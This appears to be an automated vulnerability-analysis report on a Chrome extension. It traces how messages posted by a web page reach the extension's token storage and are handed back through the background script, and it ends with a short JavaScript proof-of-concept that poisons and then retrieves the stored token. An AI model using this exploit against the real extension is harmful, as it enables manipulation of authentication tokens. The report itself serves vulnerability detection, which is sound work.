# CoCo Analysis: hplepebofmapipnhembojkgppkkegaie

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** Multiple (consolidated as complete storage exploitation chain)

---

## Sink: cs_window_eventListener_message → chrome_storage_local_set_sink → storage_get → sendResponse

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hplepebofmapipnhembojkgppkkegaie/opgen_generated_files/cs_0.js
Line 480: window.addEventListener('message', function(e) {
Line 481: var message = e.data;
Line 483: if (message && message.is_token && (message.mode == 'not_set')) {
Line 485: chrome.storage.local.set({ device_whitelist_token : message }

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hplepebofmapipnhembojkgppkkegaie/opgen_generated_files/bg.js
Line 997: chrome.storage.local.get(['token']).then((token) => {
Line 998: sendResponse(token);

**Code:**

```javascript
// Content script cs_0.js - Entry point (Line 480-492)
window.addEventListener('message', function(e) {
    var message = e.data; // ← attacker-controlled

    if (message && message.is_token && (message.mode == 'not_set')) {
        // store the attacker-controlled token
        chrome.storage.local.set({ device_whitelist_token : message }, function() {
            chrome.runtime.sendMessage(message); // ← sends to background
            window.postMessage('ts_device_whitelist extension token stored');
        });
    }
});

// Content script cs_1.js - Alternative entry point (Line 469-489)
window.addEventListener('message', function(e) {
    var message = e.data; // ← attacker-controlled

    if (message && message.is_token) {
        // store the attacker-controlled token
        chrome.storage.local.set({ device_whitelist_token : message }, function() {
            chrome.runtime.sendMessage(message); // ← sends to background
            window.postMessage('ts_device_whitelist extension token stored');
        });
    }
});

// Background script bg.js - Storage retrieval and response (Line 986-1006)
chrome.runtime.onMessage.addListener(
    function(message, sender, sendResponse) {
        if (message && message.is_token) {
            switch(message.mode) {
                case 'not_set':
                case 'update_token':
                    // store token as given
                    chrome.storage.local.set({ token : message }); // ← stores attacker data
                    break;

                case 'get_token':
                    // return the token we're aware of
                    chrome.storage.local.get(['token']).then((token) => {
                        sendResponse(token); // ← sends poisoned data back to attacker
                    });
                    break;
            }
        }
        return true;
    }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from webpage

**Attack:**

```javascript
// Step 1: Poison storage with malicious token on traumasoft.com page
window.postMessage({
    is_token: true,
    mode: 'not_set',
    malicious_payload: 'attacker_controlled_data'
}, '*');

// Step 2: Retrieve the poisoned token
chrome.runtime.sendMessage({
    is_token: true,
    mode: 'get_token'
}, function(response) {
    console.log('Retrieved poisoned data:', response);
    // Attacker can exfiltrate the stored data
});
```

**Impact:** Complete storage exploitation chain. An attacker controlling a page on traumasoft.com (or via XSS) can poison the extension's storage with arbitrary data and retrieve it back, achieving storage manipulation and information disclosure. The extension stores authentication tokens that can be manipulated by malicious webpages, potentially allowing unauthorized device whitelisting or token theft.
